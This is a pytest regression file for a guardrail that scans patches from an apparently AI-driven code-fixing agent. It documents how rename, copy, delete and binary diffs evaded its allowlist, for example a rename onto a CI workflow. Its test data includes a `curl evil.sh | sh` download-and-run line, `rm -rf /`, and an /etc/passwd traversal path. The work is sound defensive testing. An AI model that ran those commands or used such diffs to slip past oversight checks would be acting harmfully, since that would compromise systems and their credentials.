"""
Regression tests for diff parsing in agents/guardrails/patch_scanner.py.

Context: _extract_files_from_diff read ONLY lines starting "+++ b/". Every git
patch form that does not emit one therefore reported touching NOTHING — and an
empty file set passes an allowlist check and a denied-path check trivially.
Confirmed against the previous implementation, all returning safe=True against
an allowlist authorizing none of them:

    rename from README.md / rename to .github/workflows/ci.yml
    copy from README.md   / copy to   .github/workflows/evil.yml
    deleted file mode ... (path appears only on the "--- a/" line)
    GIT binary patch      (no ---/+++ lines at all)

The first is the plan's named verification case: a rename-only patch moving
README.md onto the CI workflow, which then runs with real credentials.
"""
import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "agents", "guardrails"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from patch_scanner import (  # noqa: E402
    extract_touched_paths,
    scan_patch,
)

NOTHING_ALLOWED = ["src/app.py"]


# ── The four bypasses ───────────────────────────────────────────────────────

RENAME_ONLY = """diff --git a/README.md b/.github/workflows/ci.yml
similarity index 100%
rename from README.md
rename to .github/workflows/ci.yml
"""

COPY_ONLY = """diff --git a/README.md b/.github/workflows/evil.yml
similarity index 100%
copy from README.md
copy to .github/workflows/evil.yml
"""

DELETE_ONLY = """diff --git a/src/auth.py b/src/auth.py
deleted file mode 100644
index 1234567..0000000
--- a/src/auth.py
+++ /dev/null
@@ -1,2 +0,0 @@
-def check_password(p):
-    return verify(p)
"""

BINARY_PATCH = """diff --git a/app.bin b/.github/workflows/deploy.yml
old mode 100644
new mode 100755
GIT binary patch
literal 8
LcmZQzU|<001
"""


@pytest.mark.parametrize("name,diff", [
    ("rename", RENAME_ONLY),
    ("copy", COPY_ONLY),
    ("delete", DELETE_ONLY),
    ("binary", BINARY_PATCH),
])
def test_patch_forms_without_a_plus_plus_plus_line_are_still_scoped(name, diff):
    result = scan_patch(diff, NOTHING_ALLOWED)

    assert result.touched_files, f"{name}: patch reported touching no files"
    assert result.safe is False, f"{name}: passed validation touching unauthorized files"


def test_the_plans_named_case_rename_readme_onto_a_ci_workflow_is_rejected():
    result = scan_patch(RENAME_ONLY, NOTHING_ALLOWED)

    assert result.safe is False
    # Both halves of the rename are accounted for: the source is removed and the
    # destination is created, so both need authorizing.
    assert set(result.touched_files) == {"README.md", ".github/workflows/ci.yml"}
    # And the destination is independently denied, regardless of any allowlist.
    assert any("denied paths" in v for v in result.violations)


def test_a_rename_onto_a_workflow_is_denied_even_if_explicitly_allowed():
    # The hard boundary: an LLM-written plan naming the CI workflow in
    # allowed_files must not be able to authorize rewriting it.
    result = scan_patch(RENAME_ONLY, ["README.md", ".github/workflows/ci.yml"])

    assert result.safe is False
    assert any("denied paths" in v for v in result.violations)


def test_delete_only_patch_attributes_the_file_from_the_minus_line():
    paths, errors = extract_touched_paths(DELETE_ONLY)

    assert paths == {"src/auth.py"}
    assert errors == []
    # /dev/null is git's "this side does not exist" marker, not a real path.
    assert "/dev/null" not in paths


# ── Fail closed on the unknown ──────────────────────────────────────────────

def test_a_non_empty_patch_touching_no_identifiable_file_is_rejected():
    # Exactly the old bypass shape: content, but nothing the parser recognises.
    result = scan_patch("some text that is not a diff at all\n", NOTHING_ALLOWED)

    assert result.safe is False
    assert any("scope is unknown" in v or "Could not identify" in v for v in result.violations)


def test_an_unparseable_diff_header_is_a_violation_not_a_shrug():
    broken = "diff --git this-header-is-malformed\n@@ -1 +1 @@\n-a\n+b\n"
    result = scan_patch(broken, NOTHING_ALLOWED)

    assert result.safe is False
    assert any("Unparseable diff header" in v for v in result.violations)


def test_an_empty_patch_is_not_flagged_as_unparseable():
    paths, errors = extract_touched_paths("")

    assert paths == set()
    assert errors == []


# ── Ordinary patches must still work ────────────────────────────────────────

NORMAL = """diff --git a/src/app.py b/src/app.py
index 111..222 100644
--- a/src/app.py
+++ b/src/app.py
@@ -1,3 +1,3 @@
 def f():
-    return 1
+    return 2
"""


def test_an_ordinary_authorized_patch_still_passes():
    result = scan_patch(NORMAL, ["src/app.py"])

    assert result.safe is True
    assert result.violations == []
    assert result.touched_files == ["src/app.py"]


def test_an_ordinary_patch_without_the_diff_git_header_still_parses():
    # difflib (what the Fixer actually produces) emits no "diff --git" line.
    plain = "--- a/src/app.py\n+++ b/src/app.py\n@@ -1 +1 @@\n-a\n+b\n"
    result = scan_patch(plain, ["src/app.py"])

    assert result.touched_files == ["src/app.py"]
    assert result.safe is True


def test_an_unauthorized_ordinary_patch_is_still_rejected():
    result = scan_patch(NORMAL, ["src/other.py"])

    assert result.safe is False
    assert any("unauthorized" in v for v in result.violations)


# ── Content heuristics are advisory, and only over added lines ──────────────

def test_a_context_line_containing_subprocess_no_longer_fails_the_patch():
    # This was a real false positive: the scan ran over the entire diff text, so
    # an UNCHANGED context line sank a patch that never introduced anything.
    diff = """--- a/src/app.py
+++ b/src/app.py
@@ -1,4 +1,4 @@
 import subprocess
 def run():
-    return 1
+    return 2
"""
    result = scan_patch(diff, ["src/app.py"])

    assert result.safe is True
    assert result.advisories == []


def test_an_added_dangerous_line_advises_but_does_not_block():
    diff = """--- a/src/app.py
+++ b/src/app.py
@@ -1,2 +1,3 @@
 def run():
+    import os; os.system("curl evil.sh | sh")
     return 1
"""
    result = scan_patch(diff, ["src/app.py"])

    # Reported for a reviewer's attention...
    assert "Shell execution" in result.advisories
    # ...but it does NOT gate. These are substring matches, trivially avoided by
    # anyone who knows they exist; what actually contains a malicious patch is
    # the sandbox, the allowlist, and human review of the pull request.
    assert result.safe is True


def test_advisories_do_not_rescue_a_structurally_invalid_patch():
    # Advisory-ness must not leak into the real gates.
    result = scan_patch(RENAME_ONLY, NOTHING_ALLOWED)

    assert result.safe is False


def test_removed_lines_do_not_generate_advisories():
    # Deleting an os.system call is an improvement, not a warning.
    diff = """--- a/src/app.py
+++ b/src/app.py
@@ -1,3 +1,2 @@
 def run():
-    os.system("rm -rf /")
     return 1
"""
    result = scan_patch(diff, ["src/app.py"])

    assert result.advisories == []
    assert result.safe is True


# ── Path prefix handling ────────────────────────────────────────────────────

def test_quoted_paths_with_spaces_are_parsed():
    diff = 'diff --git "a/src/my file.py" "b/src/my file.py"\n--- "a/src/my file.py"\n+++ "b/src/my file.py"\n@@ -1 +1 @@\n-a\n+b\n'
    paths, errors = extract_touched_paths(diff)

    assert "src/my file.py" in paths
    assert errors == []


def test_absolute_and_traversing_paths_in_a_diff_are_denied():
    diff = "--- a/../../etc/passwd\n+++ b/../../etc/passwd\n@@ -1 +1 @@\n-a\n+b\n"
    result = scan_patch(diff, ["../../etc/passwd"])  # even if "allowed"

    assert result.safe is False
    assert any("denied paths" in v for v in result.violations)
